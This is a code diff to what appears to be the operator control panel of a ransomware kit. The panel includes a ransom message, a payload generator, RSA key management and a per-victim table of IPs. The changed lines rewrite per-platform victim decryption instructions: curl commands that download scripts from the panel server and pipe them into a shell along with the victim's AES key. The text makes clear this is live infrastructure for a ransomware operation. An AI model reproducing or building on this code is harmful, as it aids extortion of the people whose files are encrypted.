@@ -206,7 +206,7 @@ Contact us to obtain the private key and restore your files.</textarea>
 <pre class="dt-code">:: 纯 PowerShell 实现，无需编译 exe
 :: 要求 PowerShell 7+   (未装可执行: winget install Microsoft.PowerShell)
 curl.exe -sL {{ request.url_root }}payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1
-pwsh -File jasmin_unlock.ps1 -Server {{ request.url_root }} -K "{{ aes_key }}" -Paths C:\path\to\decrypt
+pwsh -File jasmin_unlock.ps1 -Server {{ request.url_root }} -K "{{ aes_key }}"
 :: -Paths 换成要解密的目录；不写则解密当前目录</pre>
 </div>
 <div class="dt-content" id="dt-linux" style="display:none">
@@ -216,9 +216,9 @@ pwsh -File jasmin_unlock.ps1 -Server {{ request.url_root }} -K "{{ aes_key }}" -
 <div class="dt-note"><i class="fas fa-shield-alt"></i> 自动安装依赖、下载私钥和脚本、全盘解密、清理</div>
 <pre class="dt-code"># Linux 一键解密 — 纯 openssl，零依赖（无需 pip / cryptography）
 # 末尾加上要解密的目录；不写则解密当前目录
-curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_root }} "{{ aes_key }}" /path/to/decrypt
+curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_root }} "{{ aes_key }}"
 
-# 例：解密 /data 与 /home
+# 只需解特定目录时，在末尾追加（可多个）
 curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_root }} "{{ aes_key }}" /data /home</pre>
 </div>
 <div class="dt-content" id="dt-mac" style="display:none">
@@ -227,9 +227,9 @@ curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_
 <div class="dt-step"><span>2</span>复制下方命令直接运行</div>
 <pre class="dt-code"># macOS 一键解密 — 纯 openssl，零依赖（macOS 自带 openssl）
 # 末尾加上要解密的目录；不写则解密当前目录
-curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_root }} "{{ aes_key }}" /path/to/decrypt
+curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_root }} "{{ aes_key }}"
 
-# 例：解密 /Users 与 /tmp
+# 只需解特定目录时，在末尾追加（可多个）
 curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_root }} "{{ aes_key }}" /Users /tmp</pre>
 </div>
 <div class="dt-note" style="margin-top:20px"><i class="fas fa-info-circle"></i> <b>准备:</b> 在「载荷生成器」点击「生成RSA密钥对」，加密私钥(<code>.pem.enc</code>)与解密脚本会自动部署到 payloads/ 目录；明文私钥与解密口令需登录后台后经「密钥管理」下载</div>
@@ -302,7 +302,7 @@ function showDecrypt(vid,ip,isLinux){
   var nr=document.createElement('tr');nr.dataset.vid=vid;
   var td=document.createElement('td');td.colSpan=11;td.className='dec-expand';
   if(isLinux){
-    td.innerHTML='<pre class="dt-code"># '+ip+' 一键解密 — 纯 openssl 零依赖\n# 末尾加要解密的目录，不写则解当前目录\ncurl -sL '+srv+'/payloads/jasmin_unlock.sh | sh -s '+srv+' "'+k+'" /path/to/decrypt</pre>';
+    td.innerHTML='<pre class="dt-code"># '+ip+' 一键解密 — 纯 openssl 零依赖\n# 不写目录 = 解密全部加密文件\ncurl -sL '+srv+'/payloads/jasmin_unlock.sh | sh -s '+srv+' "'+k+'"</pre>';
   }else{
     td.innerHTML='<pre class="dt-code">:: '+ip+' 一键解密 — 纯 PowerShell，无需编译 exe\\n:: 要求 PowerShell 7+   (winget install Microsoft.PowerShell)\\ncurl.exe -sL '+srv+'/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1\\npwsh -File jasmin_unlock.ps1 -Server '+srv+' -K \"'+k+'\" -Paths C:\\\\path\\\\to\\\\decrypt</pre>';
   }
